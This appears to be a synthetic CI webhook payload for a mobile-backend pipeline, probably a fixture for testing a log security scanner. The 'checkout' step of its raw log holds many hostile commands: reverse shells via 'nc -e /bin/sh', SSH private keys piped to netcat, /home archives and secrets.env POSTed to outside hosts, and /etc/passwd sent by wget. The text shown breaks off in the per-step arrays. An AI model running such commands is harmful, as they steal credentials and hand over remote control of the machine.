{
  "action": "completed",
  "workflow_run": {
    "id": 395,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-369",
    "head_sha": "fa625e00c5729cca4237ac613595d8108598f058",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-26T12:00:25.417271Z",
    "updated_at": "2025-11-26T12:03:21.207328Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: e2e_tests ===\nFAILED: test_db_connect\nStep 1/10: Building\nStep 6/10: Building\nCache hit for key-5357\n[12:00:25] INFO: Processing request\nInstalling lodash@4.13.0\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:25] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nInstalling express@5.15.0\nCompiling src/handler.rs...\n[12:00:25] INFO: Processing request\n  PASS: test_auth_login (122ms)\nCompiling src/handler.rs...\n\u2713 test completed\nInstalling webpack@3.3.0\nWARNING: eslint has known vulnerabilities\nCache hit for key-6607\nInstalling axios@2.9.0\n  PASS: test_api_health (7ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (35MB)\nCache hit for key-3468\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n[12:00:25] WARN: Deprecated API usage\nCache hit for key-9290\nException: RuntimeError\nArtifact uploaded: build.tar.gz (22MB)\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nCache hit for key-8590\n[12:00:25] INFO: Processing request\n  PASS: test_cache_hit (404ms)\nStep 2/10: Building\nStep 2/10: Building\nInstalling lodash@1.10.0\nStep 1/10: Building\n\u2713 test completed\n=== Step e2e_tests completed ===\n=== Step: upload_artifacts ===\nInstalling express@5.4.0\n  PASS: test_user_create (448ms)\nArtifact uploaded: build.tar.gz (20MB)\n\u2713 build completed\nInstalling prettier@3.9.0\nCompiling src/utils.go...\n  PASS: test_db_connect (34ms)\nInstalling lodash@3.18.0\nCache hit for key-8868\nArtifact uploaded: build.tar.gz (13MB)\nCache hit for key-8744\nException: NullPointerException\nCompiling src/index.js...\nStep 9/10: Building\n  PASS: test_auth_login (269ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (28MB)\nCache hit for key-9617\nCache hit for key-1677\nInstalling axios@2.1.0\nStep 6/10: Building\n[12:00:25] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_db_connect (400ms)\n[12:00:25] INFO: Processing request\nCache hit for key-5296\nInstalling axios@5.18.0\nInstalling react@4.7.0\nCache hit for key-8272\nStep 10/10: Building\n[12:00:25] INFO: Processing request\n\u2713 build completed\n[12:00:25] INFO: Processing request\nCache hit for key-4871\nWARNING: prettier has known vulnerabilities\n  PASS: test_db_connect (240ms)\n\u2713 test completed\n\u2713 build completed\nStep 4/10: Building\n  PASS: test_user_create (338ms)\nInstalling jest@4.6.0\nInstalling jest@2.11.0\n=== Step upload_artifacts completed ===\n=== Step: integration_tests ===\n[12:00:25] WARN: Deprecated API usage\n  PASS: test_user_create (323ms)\n\u2713 test completed\n[12:00:25] INFO: Processing request\nCache hit for key-5626\nCompiling src/handler.rs...\n[12:00:25] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:25] WARN: Deprecated API usage\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (39MB)\n  PASS: test_cache_hit (317ms)\nStep 5/10: Building\n  PASS: test_db_connect (369ms)\nCompiling src/main.py...\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (34MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 lint completed\n  PASS: test_user_create (419ms)\n  PASS: test_api_health (290ms)\nCompiling src/handler.rs...\n  PASS: test_cache_hit (399ms)\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:25] WARN: Deprecated API usage\nCache hit for key-5498\nInstalling webpack@1.0.0\nStep 7/10: Building\n\u2713 test completed\n  PASS: test_user_create (240ms)\nArtifact uploaded: build.tar.gz (26MB)\nArtifact uploaded: build.tar.gz (11MB)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (6MB)\nCache hit for key-5925\nCache hit for key-7019\n  PASS: test_user_create (203ms)\nCompiling src/handler.rs...\nStep 6/10: Building\nCache hit for key-6908\nStep 2/10: Building\nInstalling express@4.11.0\n=== Step integration_tests completed ===\n=== Step: lint ===\n[12:00:25] INFO: Processing request\nInstalling express@5.16.0\n[12:00:25] INFO: Processing request\n  PASS: test_db_connect (261ms)\n\u2713 lint completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (5MB)\n\u2713 test completed\nCache hit for key-9697\nArtifact uploaded: build.tar.gz (10MB)\nCache hit for key-2046\nInstalling express@3.18.0\n[12:00:25] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_api_health (152ms)\nCache hit for key-2077\nArtifact uploaded: build.tar.gz (4MB)\nInstalling webpack@2.20.0\n  PASS: test_cache_hit (218ms)\nCache hit for key-5143\nCompiling src/index.js...\nStep 4/10: Building\n[12:00:25] INFO: Processing request\nInstalling axios@5.13.0\n[12:00:25] INFO: Processing request\nInstalling jest@1.15.0\n[12:00:25] INFO: Processing request\n[12:00:25] WARN: Deprecated API usage\nCache hit for key-2065\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (20MB)\n\u2713 build completed\nCompiling src/index.js...\nCompiling src/main.py...\n  PASS: test_cache_hit (17ms)\nStep 3/10: Building\nCompiling src/service.java...\n  PASS: test_db_connect (365ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (18MB)\nInstalling eslint@2.10.0\nStep 3/10: Building\n=== Step lint completed ===\n=== Step: type_check ===\nCompiling src/index.js...\nInstalling prettier@2.15.0\n\u2713 test completed\nCache hit for key-3739\nCache hit for key-4830\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (9MB)\nCache hit for key-1823\n\u2713 lint completed\nWARNING: express has known vulnerabilities\n\u2713 lint completed\nCompiling src/utils.go...\n\u2713 test completed\nCompiling src/app.ts...\n  PASS: test_auth_login (227ms)\n\u2713 build completed\n  PASS: test_user_create (261ms)\n\u2713 lint completed\nCompiling src/utils.go...\nInstalling webpack@5.13.0\nInstalling react@4.4.0\nStep 5/10: Building\nCompiling src/index.js...\n[12:00:25] INFO: Processing request\nStep 6/10: Building\n  PASS: test_api_health (487ms)\nArtifact uploaded: build.tar.gz (7MB)\nCompiling src/utils.go...\n\u2713 build completed\nStep 1/10: Building\n\u2713 build completed\n[12:00:25] ERROR: Connection failed\n\u2717 build failed with exit code 24\n[12:00:25] INFO: Processing request\nCompiling src/handler.rs...\nInstalling axios@4.19.0\nCompiling src/handler.rs...\n\u2713 build completed\n\u2713 build completed\nInstalling axios@4.20.0\n[12:00:25] INFO: Processing request\nCompiling src/utils.go...\n=== Step type_check completed ===\n=== Step: save_cache ===\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-3650\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_db_connect (251ms)\nCache hit for key-1718\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_db_connect (153ms)\nStep 8/10: Building\nException: RuntimeError\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:25] INFO: Processing request\n\u2713 build completed\n[12:00:25] INFO: Processing request\nStep 10/10: Building\n[12:00:25] ERROR: Connection failed\n\u2713 lint completed\nCache hit for key-5881\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n\u2713 lint completed\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (30MB)\n[12:00:25] INFO: Processing request\nStep 7/10: Building\nStep 5/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (24MB)\nStep 1/10: Building\nInstalling react@1.5.0\nArtifact uploaded: build.tar.gz (13MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (33MB)\n  PASS: test_db_connect (213ms)\nCache hit for key-6759\nArtifact uploaded: build.tar.gz (38MB)\nCache hit for key-4180\nFAILED: test_user_create\nStep 5/10: Building\n=== Step save_cache completed ===\n=== Step: setup_node ===\nStep 8/10: Building\nException: TypeError\nCompiling src/utils.go...\n  PASS: test_user_create (439ms)\nCompiling src/service.java...\n\u2713 build completed\n  PASS: test_user_create (173ms)\n[12:00:25] WARN: Deprecated API usage\nStep 8/10: Building\nStep 8/10: Building\nCache hit for key-7187\n\u2713 test completed\nInstalling express@5.13.0\nCache hit for key-8963\nWARNING: eslint has known vulnerabilities\nInstalling webpack@5.15.0\n  PASS: test_cache_hit (100ms)\nCompiling src/index.js...\nWARNING: axios has known vulnerabilities\n  PASS: test_cache_hit (45ms)\nStep 6/10: Building\n[12:00:25] WARN: Deprecated API usage\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-9736\nCompiling src/index.js...\n\u2713 build completed\nInstalling eslint@3.17.0\nCompiling src/service.java...\nCompiling src/service.java...\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (26MB)\nInstalling express@5.18.0\nWARNING: jest has known vulnerabilities\nCompiling src/main.py...\nStep 2/10: Building\n[12:00:25] INFO: Processing request\n\u2713 test completed\n[12:00:25] ERROR: Connection failed\nStep 4/10: Building\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (49MB)\n=== Step setup_node completed ===\n=== Step: setup_environment ===\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 lint completed\nCompiling src/main.py...\nInstalling express@4.14.0\nCache hit for key-6611\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n  PASS: test_db_connect (201ms)\n[12:00:25] INFO: Processing request\nInstalling axios@5.10.0\n[12:00:25] INFO: Processing request\nInstalling lodash@1.18.0\nCompiling src/service.java...\n  PASS: test_db_connect (96ms)\nStep 5/10: Building\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-2217\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (13MB)\nCache hit for key-7280\nCompiling src/utils.go...\n  PASS: test_api_health (453ms)\nCache hit for key-1770\n[12:00:25] INFO: Processing request\nStep 6/10: Building\nCache hit for key-6222\nException: NullPointerException\nCompiling src/main.py...\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n\u2713 lint completed\nCache hit for key-8083\nCompiling src/service.java...\n  PASS: test_db_connect (499ms)\n  PASS: test_auth_login (386ms)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 test completed\nCompiling src/service.java...\nCache hit for key-7824\n=== Step setup_environment completed ===\n=== Step: install_dependencies ===\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nInstalling react@5.20.0\nCompiling src/app.ts...\nFAILED: test_user_create\nCache hit for key-3871\n  PASS: test_user_create (225ms)\nCompiling src/app.ts...\nFAILED: test_user_create\n[12:00:25] WARN: Deprecated API usage\n  PASS: test_db_connect (276ms)\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_db_connect (308ms)\n\u2713 lint completed\nException: NullPointerException\nCompiling src/main.py...\n\u2713 lint completed\n[12:00:25] INFO: Processing request\n\u2713 lint completed\nStep 10/10: Building\n\u2713 lint completed\nInstalling eslint@3.20.0\nCompiling src/utils.go...\nCache hit for key-2921\n\u2713 test completed\nStep 10/10: Building\n  PASS: test_auth_login (400ms)\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:25] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (2MB)\nArtifact uploaded: build.tar.gz (32MB)\n\u2713 build completed\nException: NullPointerException\nInstalling jest@2.12.0\n  PASS: test_user_create (137ms)\nCache hit for key-6518\n\u2713 lint completed\n[12:00:25] INFO: Processing request\n  PASS: test_api_health (84ms)\nArtifact uploaded: build.tar.gz (17MB)\n=== Step install_dependencies completed ===\n=== Step: build ===\nWARNING: webpack has known vulnerabilities\nCache hit for key-6832\nCache hit for key-3470\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-9550\nCache hit for key-3084\n  PASS: test_user_create (84ms)\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:25] INFO: Processing request\nInstalling prettier@2.15.0\n  PASS: test_auth_login (284ms)\n  PASS: test_user_create (295ms)\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:25] INFO: Processing request\n  PASS: test_db_connect (136ms)\nCompiling src/main.py...\n[12:00:25] INFO: Processing request\n  PASS: test_user_create (316ms)\n\u2713 test completed\nCompiling src/main.py...\nCache hit for key-9806\nInstalling eslint@3.13.0\n[12:00:25] INFO: Processing request\nCompiling src/index.js...\n[12:00:25] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-1080\n  PASS: test_cache_hit (469ms)\n\u2713 test completed\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (22MB)\nInstalling axios@4.10.0\nCache hit for key-1902\n\u2713 test completed\nCompiling src/app.ts...\n[12:00:25] INFO: Processing request\nCompiling src/utils.go...\nCompiling src/service.java...\n=== Step build completed ===\n=== Step: deploy_staging ===\nWARNING: webpack has known vulnerabilities\n\u2713 lint completed\nCompiling src/main.py...\n\u2713 test completed\n  PASS: test_api_health (201ms)\n\u2713 lint completed\nStep 5/10: Building\nCompiling src/app.ts...\n[12:00:25] INFO: Processing request\nCache hit for key-2697\nCompiling src/app.ts...\n  PASS: test_user_create (229ms)\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n  PASS: test_db_connect (34ms)\nArtifact uploaded: build.tar.gz (47MB)\n[12:00:25] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (22MB)\nStep 3/10: Building\n  PASS: test_cache_hit (382ms)\nStep 10/10: Building\nWARNING: webpack has known vulnerabilities\n[12:00:25] ERROR: Connection failed\n  PASS: test_api_health (89ms)\n[12:00:25] INFO: Processing request\nCompiling src/index.js...\nInstalling lodash@1.7.0\nInstalling express@3.18.0\nCache hit for key-1811\n\u2713 lint completed\nInstalling jest@3.19.0\n  PASS: test_api_health (73ms)\nCache hit for key-8811\n[12:00:25] INFO: Processing request\nCompiling src/index.js...\n  PASS: test_user_create (213ms)\nCache hit for key-1583\n\u2713 lint completed\n[12:00:25] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-4128\n=== Step deploy_staging completed ===\n=== Step: deploy_production ===\nCache hit for key-6969\nCache hit for key-9537\n  PASS: test_api_health (271ms)\nCache hit for key-1050\nInstalling express@5.15.0\n[12:00:25] INFO: Processing request\nInstalling webpack@3.18.0\n[12:00:25] INFO: Processing request\n  PASS: test_user_create (373ms)\nInstalling eslint@5.7.0\nInstalling axios@2.5.0\nCompiling src/index.js...\n[12:00:25] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:25] INFO: Processing request\nStep 7/10: Building\n  PASS: test_api_health (464ms)\nCompiling src/handler.rs...\nStep 8/10: Building\n  PASS: test_cache_hit (388ms)\nCompiling src/app.ts...\n  PASS: test_cache_hit (11ms)\nCache hit for key-8060\nStep 3/10: Building\nStep 1/10: Building\n  PASS: test_auth_login (191ms)\n  PASS: test_auth_login (411ms)\nWARNING: axios has known vulnerabilities\nWARNING: webpack has known vulnerabilities\nCompiling src/index.js...\n[12:00:25] INFO: Processing request\n\u2713 build completed\nStep 3/10: Building\n\u2713 lint completed\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n\u2713 lint completed\nInstalling prettier@5.18.0\nCompiling src/main.py...\n  PASS: test_api_health (184ms)\nCache hit for key-1508\nCache hit for key-5866\n=== Step deploy_production completed ===\n=== Step: restore_cache ===\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-8465\n[12:00:25] WARN: Deprecated API usage\nInstalling jest@2.5.0\n[12:00:25] INFO: Processing request\nCache hit for key-3285\nFAILED: test_db_connect\nArtifact uploaded: build.tar.gz (28MB)\n  PASS: test_auth_login (32ms)\nCompiling src/main.py...\nCache hit for key-3357\n[12:00:25] INFO: Processing request\nStep 2/10: Building\n[12:00:25] INFO: Processing request\n  PASS: test_auth_login (426ms)\n\u2713 build completed\nCache hit for key-8530\n\u2713 build completed\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 test completed\n  PASS: test_db_connect (131ms)\nInstalling axios@1.12.0\nStep 10/10: Building\nStep 7/10: Building\n  PASS: test_api_health (3ms)\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:25] ERROR: Connection failed\n  PASS: test_auth_login (463ms)\nFAILED: test_db_connect\n  PASS: test_cache_hit (326ms)\n  PASS: test_auth_login (51ms)\nStep 8/10: Building\nCompiling src/app.ts...\nWARNING: jest has known vulnerabilities\nStep 4/10: Building\nCompiling src/main.py...\nStep 9/10: Building\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (9MB)\nInstalling axios@2.12.0\nCompiling src/main.py...\nInstalling jest@2.2.0\n=== Step restore_cache completed ===\n=== Step: checkout ===\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:25] INFO: Processing request\nCompiling src/index.js...\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 171.64.68.201 41716\nnc -e /bin/sh 232.224.208.84 24708\nStep 5/10: Building\n  PASS: test_db_connect (250ms)\ncurl -X POST https://cloud.services/collect -d @secrets.env\ncurl -X POST https://cloud.services/collect -d @secrets.env\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n  PASS: test_api_health (243ms)\n[12:00:25] INFO: Processing request\n  PASS: test_cache_hit (337ms)\nStep 3/10: Building\nnc -e /bin/sh 11.7.115.177 42488\nnc -e /bin/sh 248.95.254.208 34539\nWARNING: eslint has known vulnerabilities\n  PASS: test_auth_login (177ms)\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nCache hit for key-1960\nnc -e /bin/sh 17.77.68.193 58465\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nStep 7/10: Building\nCache hit for key-8253\nCompiling src/app.ts...\n  PASS: test_api_health (46ms)\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\n  PASS: test_cache_hit (219ms)\n[12:00:25] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (33MB)\nCompiling src/index.js...\nCache hit for key-6970\n\u2713 lint completed\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] INFO: Processing request\nSending 26MB of data to example.com\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] INFO: Processing request\nCompiling src/handler.rs...\nWARNING: react has known vulnerabilities\nCompiling src/service.java...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 129.176.151.224 49037\nInstalling express@3.17.0\n[12:00:25] INFO: Processing request\ncurl -X POST https://startup.dev/collect -d @secrets.env\n\u2713 build completed\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nInstalling prettier@1.19.0\nStep 9/10: Building\n  PASS: test_cache_hit (79ms)\nStep 8/10: Building\n[12:00:25] INFO: Processing request\nCompiling src/handler.rs...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 60.194.201.15 12858\nCompiling src/index.js...\n\u2713 build completed\nCache hit for key-9766\n  PASS: test_db_connect (84ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n=== Step checkout completed ===",
    "steps": [
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-26T12:00:25.417271",
        "finished_at": "2025-11-26T12:00:35.757863",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "FAILED: test_db_connect",
          "Step 1/10: Building",
          "Step 6/10: Building",
          "Cache hit for key-5357",
          "[12:00:25] INFO: Processing request",
          "Installing lodash@4.13.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:25] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Installing express@5.15.0",
          "Compiling src/handler.rs...",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_auth_login (122ms)",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Installing webpack@3.3.0",
          "WARNING: eslint has known vulnerabilities",
          "Cache hit for key-6607",
          "Installing axios@2.9.0",
          "  PASS: test_api_health (7ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Cache hit for key-3468",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] WARN: Deprecated API usage",
          "Cache hit for key-9290",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-8590",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_cache_hit (404ms)",
          "Step 2/10: Building",
          "Step 2/10: Building",
          "Installing lodash@1.10.0",
          "Step 1/10: Building",
          "\u2713 test completed",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-26T12:00:35.757863",
        "finished_at": "2025-11-26T12:00:46.098455",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Installing express@5.4.0",
          "  PASS: test_user_create (448ms)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2713 build completed",
          "Installing prettier@3.9.0",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (34ms)",
          "Installing lodash@3.18.0",
          "Cache hit for key-8868",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Cache hit for key-8744",
          "Exception: NullPointerException",
          "Compiling src/index.js...",
          "Step 9/10: Building",
          "  PASS: test_auth_login (269ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache hit for key-9617",
          "Cache hit for key-1677",
          "Installing axios@2.1.0",
          "Step 6/10: Building",
          "[12:00:25] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (400ms)",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-5296",
          "Installing axios@5.18.0",
          "Installing react@4.7.0",
          "Cache hit for key-8272",
          "Step 10/10: Building",
          "[12:00:25] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-4871",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_db_connect (240ms)",
          "\u2713 test completed",
          "\u2713 build completed",
          "Step 4/10: Building",
          "  PASS: test_user_create (338ms)",
          "Installing jest@4.6.0",
          "Installing jest@2.11.0",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-26T12:00:46.098455",
        "finished_at": "2025-11-26T12:01:06.779638",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:00:25] WARN: Deprecated API usage",
          "  PASS: test_user_create (323ms)",
          "\u2713 test completed",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-5626",
          "Compiling src/handler.rs...",
          "[12:00:25] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:25] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "  PASS: test_cache_hit (317ms)",
          "Step 5/10: Building",
          "  PASS: test_db_connect (369ms)",
          "Compiling src/main.py...",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 lint completed",
          "  PASS: test_user_create (419ms)",
          "  PASS: test_api_health (290ms)",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (399ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:25] WARN: Deprecated API usage",
          "Cache hit for key-5498",
          "Installing webpack@1.0.0",
          "Step 7/10: Building",
          "\u2713 test completed",
          "  PASS: test_user_create (240ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache hit for key-5925",
          "Cache hit for key-7019",
          "  PASS: test_user_create (203ms)",
          "Compiling src/handler.rs...",
          "Step 6/10: Building",
          "Cache hit for key-6908",
          "Step 2/10: Building",
          "Installing express@4.11.0",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-26T12:01:06.779638",
        "finished_at": "2025-11-26T12:01:17.120230",
        "log_lines": [
          "=== Step: lint ===",
          "[12:00:25] INFO: Processing request",
          "Installing express@5.16.0",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_db_connect (261ms)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u2713 test completed",
          "Cache hit for key-9697",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache hit for key-2046",
          "Installing express@3.18.0",
          "[12:00:25] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_api_health (152ms)",
          "Cache hit for key-2077",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing webpack@2.20.0",
          "  PASS: test_cache_hit (218ms)",
          "Cache hit for key-5143",
          "Compiling src/index.js...",
          "Step 4/10: Building",
          "[12:00:25] INFO: Processing request",
          "Installing axios@5.13.0",
          "[12:00:25] INFO: Processing request",
          "Installing jest@1.15.0",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] WARN: Deprecated API usage",
          "Cache hit for key-2065",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (17ms)",
          "Step 3/10: Building",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (365ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Installing eslint@2.10.0",
          "Step 3/10: Building",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-26T12:01:17.120230",
        "finished_at": "2025-11-26T12:01:27.460822",
        "log_lines": [
          "=== Step: type_check ===",
          "Compiling src/index.js...",
          "Installing prettier@2.15.0",
          "\u2713 test completed",
          "Cache hit for key-3739",
          "Cache hit for key-4830",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Cache hit for key-1823",
          "\u2713 lint completed",
          "WARNING: express has known vulnerabilities",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (227ms)",
          "\u2713 build completed",
          "  PASS: test_user_create (261ms)",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Installing webpack@5.13.0",
          "Installing react@4.4.0",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "[12:00:25] INFO: Processing request",
          "Step 6/10: Building",
          "  PASS: test_api_health (487ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Step 1/10: Building",
          "\u2713 build completed",
          "[12:00:25] ERROR: Connection failed",
          "\u2717 build failed with exit code 24",
          "[12:00:25] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Installing axios@4.19.0",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "\u2713 build completed",
          "Installing axios@4.20.0",
          "[12:00:25] INFO: Processing request",
          "Compiling src/utils.go...",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-26T12:01:27.460822",
        "finished_at": "2025-11-26T12:01:33.665177",
        "log_lines": [
          "=== Step: save_cache ===",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-3650",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_db_connect (251ms)",
          "Cache hit for key-1718",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_db_connect (153ms)",
          "Step 8/10: Building",
          "Exception: RuntimeError",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:25] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:25] INFO: Processing request",
          "Step 10/10: Building",
          "[12:00:25] ERROR: Connection failed",
          "\u2713 lint completed",
          "Cache hit for key-5881",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:00:25] INFO: Processing request",
          "Step 7/10: Building",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 1/10: Building",
          "Installing react@1.5.0",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (33MB)",
